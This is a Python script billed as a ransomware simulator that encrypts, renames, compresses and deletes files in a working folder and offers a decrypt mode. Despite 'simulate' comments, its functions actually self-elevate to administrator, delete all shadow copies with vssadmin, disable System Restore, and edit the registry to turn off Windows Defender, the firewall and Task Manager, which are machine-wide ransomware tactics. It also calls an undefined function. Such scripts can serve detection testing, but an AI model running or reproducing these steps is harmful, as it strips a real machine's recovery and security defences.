import os
import time
import random
import string
import json
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from shutil import make_archive, rmtree
from stat import S_IWRITE, S_IREAD, S_IRWXU, S_IRWXG, S_IRWXO
from dotenv import load_dotenv
import subprocess
import ctypes
import sys

# Setup: Define the working directory
WORKING_DIR = "/Users/nadir/ransomware" 
os.makedirs(WORKING_DIR, exist_ok=True)
METADATA_FILE = "metadata.json"

# Metadata for encryption and renaming
file_metadata = {}  # In-memory metadata for tracking operations

"""Check if the script is running with administrative privileges."""
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except Exception:
        return False

if not is_admin():
    print("Requesting administrative privileges...")
    ctypes.windll.shell32.ShellExecuteW(
        None, "runas", sys.executable, " ".join(sys.argv), None, 1
    )
    sys.exit()

# Helper Functions
def random_string(length=8):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))


def save_metadata():
    """Persist metadata to a JSON file."""
    with open(METADATA_FILE, "w") as f:
        json.dump(file_metadata, f)


def load_metadata():
    """Load metadata from a JSON file."""
    global file_metadata
    if os.path.exists(METADATA_FILE):
        with open(METADATA_FILE, "r") as f:
            file_metadata = json.load(f)


def ensure_original_file(filepath):
    """Ensure the original file is tracked in metadata."""
    if filepath not in file_metadata:
        file_metadata[filepath] = {
            "original_name": filepath,
            "encrypted": False,
            "renamed": False,
            "is_original": True
        }


def create_file(directory):
    """Create a new text file with random content."""
    try:
        filename = os.path.join(directory, f"{random_string()}.txt")
        with open(filename, 'w') as f:
            for _ in range(500):  # Create a medium file with 500 lines
                f.write(random_string(100) + '\n')
        print(f"Created: {filename}")
        ensure_original_file(filename)
        save_metadata()
        return filename
    except Exception as e:
        print(f"Error creating file: {e}")


def create_folder(directory):
    """Create a folder and populate it with random files."""
    try:
        folder_name = os.path.join(directory, f"folder_{random_string()}")
        os.makedirs(folder_name)
        print(f"Created folder: {folder_name}")

        # Create random files inside the folder
        for _ in range(random.randint(5, 10)):  # Create 5-10 files
            create_file(folder_name)

        return folder_name
    except Exception as e:
        print(f"Error creating folder: {e}")


def rename_file(filepath):
    """Rename a file to a random name."""
    try:
        metadata = file_metadata.get(filepath)
        if not metadata or metadata["renamed"]:
            print(f"Skipping renaming for: {filepath}")
            return filepath

        new_name = f"{random_string()}_{os.path.basename(filepath)}"
        new_path = os.path.join(os.path.dirname(filepath), new_name)
        os.rename(filepath, new_path)

        # Update metadata for reversibility
        file_metadata[new_path] = file_metadata.pop(filepath)
        file_metadata[new_path]["renamed"] = True
        save_metadata()
        print(f"Renamed: {filepath} -> {new_path}")
        return new_path
    except Exception as e:
        print(f"Error renaming {filepath}: {e}")
        return filepath


def encrypt_file(filepath):
    """Encrypt a file using AES-256."""
    try:
        metadata = file_metadata.get(filepath)
        if not metadata or metadata["encrypted"]:
            print(f"Skipping encryption for: {filepath}")
            return

        key = os.urandom(32)  # 256-bit key
        iv = os.urandom(16)   # 128-bit IV

        with open(filepath, 'rb') as f:
            file_data = f.read()

        # Add PKCS7 padding
        padder = padding.PKCS7(128).padder()  # 128-bit block size for AES
        padded_data = padder.update(file_data) + padder.finalize()

        cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
        encryptor = cipher.encryptor()
        encrypted_data = encryptor.update(padded_data) + encryptor.finalize()

        encrypted_filename = f"{filepath}.encrypted"
        with open(encrypted_filename, 'wb') as f:
            # Prepend key and IV to encrypted data
            f.write(key + iv + encrypted_data)

        # Update metadata for decryption
        file_metadata[encrypted_filename] = {
            "original_name": metadata["original_name"],
            "encrypted": True,
            "renamed": metadata["renamed"],
            "is_original": metadata["is_original"]
        }

        del file_metadata[filepath]
        os.remove(filepath)
        save_metadata()
        print(f"Encrypted: {encrypted_filename} (AES-256)")
    except Exception as e:
        print(f"Error encrypting {filepath}: {e}")


def encrypt_all_files(directory):
    """Encrypt all files in a directory, including existing ones."""
    try:
        for root, _, files in os.walk(directory):
            for file in files:
                file_path = os.path.join(root, file)
                if not file.endswith(".encrypted"):
                    encrypt_file(file_path)
    except Exception as e:
        print(f"Error encrypting all files: {e}")


def decrypt_file(filepath):
    """Decrypt a single file back to its original state."""
    try:
        metadata = file_metadata.get(filepath)
        if not metadata or not metadata["encrypted"]:
            print(f"Skipping decryption for: {filepath}")
            return

        with open(filepath, 'rb') as f:
            file_data = f.read()

        # Extract key, IV, and encrypted data
        key = file_data[:32]
        iv = file_data[32:48]
        encrypted_data = file_data[48:]

        cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
        decryptor = cipher.decryptor()
        decrypted_padded_data = decryptor.update(encrypted_data) + decryptor.finalize()

        # Remove PKCS7 padding
        unpadder = padding.PKCS7(128).unpadder()
        decrypted_data = unpadder.update(decrypted_padded_data) + unpadder.finalize()

        original_name = metadata["original_name"]
        with open(original_name, 'wb') as f:
            f.write(decrypted_data)

        os.remove(filepath)
        save_metadata()
        print(f"Decrypted: {filepath} -> {original_name}")

        # Update metadata
        del file_metadata[filepath]
        file_metadata[original_name] = {
            "original_name": original_name,
            "encrypted": False,
            "renamed": metadata["renamed"],
            "is_original": metadata["is_original"]
        }
        save_metadata()
    except Exception as e:
        print(f"Error decrypting {filepath}: {e}")


def decrypt_all_files(directory):
    """Decrypt all encrypted files in the directory."""
    for root, _, files in os.walk(directory):
        for file in files:
            filepath = os.path.join(root, file)
            decrypt_file(filepath)

def compress(target_path):
    """
    Compress a folder or all root-level files in the working directory.
    If target_path is a folder, compress it and replace the folder with a .zip file.
    If target_path is the WORKING_DIR, compress all root-level files into root_files.zip.
    """
    try:
        if os.path.isdir(target_path):
            # Compress a folder
            archive_name = f"{target_path}.zip"
            make_archive(target_path, 'zip', target_path)
            rmtree(target_path)  # Remove the original folder after compression
            print(f"Compressed folder: {target_path} -> {archive_name}")
        elif target_path == WORKING_DIR:
            # Compress all root-level files
            root_files = [
                os.path.join(WORKING_DIR, f)
                for f in os.listdir(WORKING_DIR)
                if os.path.isfile(os.path.join(WORKING_DIR, f))
            ]
            if root_files:
                archive_name = os.path.join(WORKING_DIR, "root_files.zip")
                make_archive(archive_name.replace('.zip', ''), 'zip', WORKING_DIR)
                for file in root_files:
                    os.remove(file)  # Delete the original root-level files
                print(f"Compressed root files to {archive_name}")
            else:
                print("No root-level files to compress.")
        else:
            print(f"Invalid path: {target_path}")
    except Exception as e:
        print(f"Error during compression: {e}")


def change_timestamps(filepath):
    """Change the timestamps of a file."""
    try:
        new_time = time.mktime((2020, 1, 1, random.randint(0, 23), random.randint(0, 59), random.randint(0, 59), 0, 0, 0))
        os.utime(filepath, (new_time, new_time))
        print(f"Timestamps changed for: {filepath}")
    except Exception as e:
        print(f"Error changing timestamps for {filepath}: {e}")


def bulk_delete():
    """Delete multiple random files, excluding original files."""
    try:
        files = [f for f in file_metadata if not file_metadata[f].get("is_original", False)]
        if files:
            files_to_delete = random.sample(files, min(len(files), random.randint(1, 5)))
            for file in files_to_delete:
                os.remove(file)
                print(f"Deleted: {file}")
                del file_metadata[file]
        save_metadata()
    except Exception as e:
        print(f"Error during bulk delete: {e}")
        
def change_permission(filepath, to_admin=False):
    """Change file permissions to simulate user/admin access."""
    try:
        if to_admin:
            os.chmod(filepath, S_IRWXU | S_IRWXG | S_IRWXO)  # Full access
        else:
            os.chmod(filepath, S_IREAD | S_IWRITE)  # Read-only
        print(f"Permissions changed for: {filepath} (Admin: {to_admin})")
    except Exception as e:
        print(f"Error changing permissions for {filepath}: {e}")

def disable_shadow_copies():
    """Simulate shadow copy deletion."""
    try:
        print("Simulating shadow copy deletion...")
        if not is_admin():
            raise PermissionError("Operation requires elevated permissions. Please rerun the script as an administrator.")
        subprocess.run(["vssadmin", "delete", "shadows", "/all", "/quiet"], check=True)
    except PermissionError as e:
        print(f"Error: {e}")
    except Exception as e:
        print(f"Error during shadow copy deletion: {e}")

def disable_system_restore():
    """Simulate disabling system restore."""
    try:
        print("Simulating disabling system restore...")
        if not is_admin():
            raise PermissionError("Operation requires elevated permissions.")
        subprocess.run(["powershell", "-Command", r"Disable-ComputerRestore -Drive C:\\"], check=True)
    except PermissionError as e:
        print(f"Error: {e}")
    except Exception as e:
        print(f"Error disabling system restore: {e}")

def modify_registry():
    """Simulate registry modifications for ransomware behavior."""
    try:
        print("Simulating registry modification...")

        # Disable Windows Defender
        subprocess.run([
            "reg", "add", r"HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender",
            "/v", "DisableAntiSpyware", "/t", "REG_DWORD", "/d", "1", "/f"
        ], check=True)
        print("Windows Defender disabled.")

        # Disable Windows Firewall (add keys if they don't exist)
        firewall_keys = [
            r"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile",
            r"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\DomainProfile"
        ]

        for key in firewall_keys:
            subprocess.run([
                "reg", "add", key, "/v", "EnableFirewall", "/t", "REG_DWORD", "/d", "0", "/f"
            ], check=True)
        print("Windows Firewall disabled.")

        # Disable Task Manager (create the System subkey if it doesn't exist)
        subprocess.run([
            "reg", "add", r"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System",
            "/f"
        ], check=True)
        subprocess.run([
            "reg", "add", r"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System",
            "/v", "DisableTaskMgr", "/t", "REG_DWORD", "/d", "1", "/f"
        ], check=True)
        print("Task Manager disabled.")

    except Exception as e:
        print(f"Error modifying registry: {e}")


def inject_operations(duration=300):
    load_metadata()  # Load metadata at the start
    # Ensure all files, including root-level, are tracked
    for root, _, files in os.walk(WORKING_DIR):
        for file in files:
            ensure_original_file(os.path.join(root, file))

    start_time = time.time()

    # one time operations
    disable_shadow_copies()
    disable_system_restore()
    modify_registry()

    operations = [
        "create_file", "create_folder", "rename_file", "encrypt_file",
        "encrypt_all_files",
        "compress_folder", "bulk_delete", "change_timestamps",
        "change_permission"
    ]

    while time.time() - start_time < duration:
        operation = random.choice(operations)

        try:
            if operation == "create_file":
                create_file(WORKING_DIR)

            elif operation == "create_folder":
                folder = create_folder(WORKING_DIR)
                if random.choice([True, False]):  # Randomly encrypt folder content
                    encrypt_folder_content(folder)

            elif operation == "rename_file":
                files = [
                    f for f in file_metadata
                    if not file_metadata[f]["renamed"]
                ]
                if files:
                    rename_file(random.choice(files))

            elif operation == "encrypt_file":
                files = [
                    f for f in file_metadata
                    if not file_metadata[f]["encrypted"]
                ]
                if files:
                    encrypt_file(random.choice(files))

            elif operation == "encrypt_all_files":
                encrypt_all_files(WORKING_DIR)

            elif operation == "compress_folder":
                folders = [
                    os.path.join(WORKING_DIR, d)
                    for d in os.listdir(WORKING_DIR)
                    if os.path.isdir(os.path.join(WORKING_DIR, d))
                ]
                if folders:
                    compress(random.choice(folders))

            elif operation == "bulk_delete":
                bulk_delete()

            elif operation == "change_timestamps":
                files = [
                    os.path.join(WORKING_DIR, f)
                    for f in os.listdir(WORKING_DIR)
                    if os.path.isfile(os.path.join(WORKING_DIR, f))
                ]
                if files:
                    change_timestamps(random.choice(files))

            elif operation == "change_permission":
                files = [
                    os.path.join(WORKING_DIR, f)
                    for f in os.listdir(WORKING_DIR)
                    if os.path.isfile(os.path.join(WORKING_DIR, f))
                ]
                if files:
                    change_permission(random.choice(files), to_admin=random.choice([True, False]))

        except Exception as e:
            print(f"Error during {operation}: {e}")

        time.sleep(random.uniform(1, 2.0))  # Random delay between operations
    save_metadata()

if __name__ == "__main__":
    action = input("Enter 'inject' to inject ransomware or 'decrypt' to decrypt files: ").strip().lower()
    if action == 'inject':
        inject_operations(duration=300)
    elif action == 'decrypt':
        load_metadata()
        decrypt_all_files(WORKING_DIR)
    else:
        print("Invalid action. Please enter 'inject' or 'decrypt'.")
